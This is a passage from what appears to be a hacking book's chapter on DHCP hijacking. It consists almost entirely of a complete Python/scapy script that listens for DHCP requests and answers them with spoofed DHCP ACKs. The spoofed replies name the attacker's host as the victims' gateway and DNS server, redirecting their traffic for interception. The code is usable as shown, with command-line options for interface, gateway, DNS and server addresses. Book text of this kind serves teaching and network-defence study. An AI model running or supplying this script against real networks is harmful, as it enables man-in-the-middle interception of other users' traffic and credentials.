 #!/usr/bin/python 2 3 import sys 4 import getopt 5 import random 6 import scapy.all as scapy 7 8 dev = "eth0" 9 gateway = None 10 nameserver = None 11 dhcpserver = None 12 client_net = "192.168.1." 13 filter = "udp port 67" 14 15 def handle_packet(packet): 16 eth = packet.getlayer(scapy.Ether) 17 ip = packet.getlayer(scapy.IP) 18 udp = packet.getlayer(scapy.UDP) 19 bootp = packet.getlayer(scapy.BOOTP) 20 dhcp = packet.getlayer(scapy.DHCP) 21 dhcp_message_type = None 22 23 if not dhcp: 24 return False 25 26 for opt in dhcp.options: 27 if opt[0] == "message-type": 28 dhcp_message_type = opt[1] 29
152 10 Bargain Box Kung Fu
30 # dhcp request 31 if dhcp_message_type == 3: 32 client_ip = client_net + str(random.randint(2,254)) 33 34 dhcp_ack = scapy.Ether(src=eth.dst, dst=eth.src) / \ 35 scapy.IP(src=dhcpserver, dst=client_ip) / \ 36 scapy.UDP(sport=udp.dport, 37 dport=udp.sport) / \ 38 scapy.BOOTP(op=2, 39 chaddr=eth.dst, 40 siaddr=gateway, 41 yiaddr=client_ip, 42 xid=bootp.xid) / \ 43 scapy.DHCP(options=[(’message-type’, 5), 44 (’requested_addr’, 45 client_ip), 46 (’subnet_mask’, 47 ’255.255.255.0’), 48 (’router’, gateway), 49 (’name_server’, 50 nameserver), 51 (’end’)]) 52 53 print "Send spoofed DHCP ACK to %s" % ip.src 54 scapy.sendp(dhcp_ack, iface=dev) 55 56 57 def usage(): 58 print sys.argv[0] + """ 59 -d <dns_ip> 60 -g <gateway_ip> 61 -i <dev> 62 -s <dhcp_ip>""" 63 sys.exit(1) 64 65 66 try: 67 cmd_opts = "d:g:i:s:" 68 opts, args = getopt.getopt(sys.argv[1:], cmd_opts) 69 except getopt.GetoptError: 70 usage() 71 72 for opt in opts: 73 if opt[0] == "-i": 74 dev = opt[1]
10.3 DHCP Hijack 153
75 elif opt[0] == "-g": 76 gateway = opt[1] 77 elif opt[0] == "-d": 78 nameserver = opt[1] 79 elif opt[0] == "-s": 80 dhcpserver = opt[1] 81 else: 82 usage() 83 84 if not gateway: 85 gateway = scapy.get_if_addr(dev) 86 87 if not nameserver: 88 nameserver = gateway 89 90 if not dhcpserver: 91 dhcpserver = gateway 92 93 print "Hijacking DHCP requests on %s" % (dev) 94 scapy.sniff(iface=dev, filter=filter, prn=handle_packet) 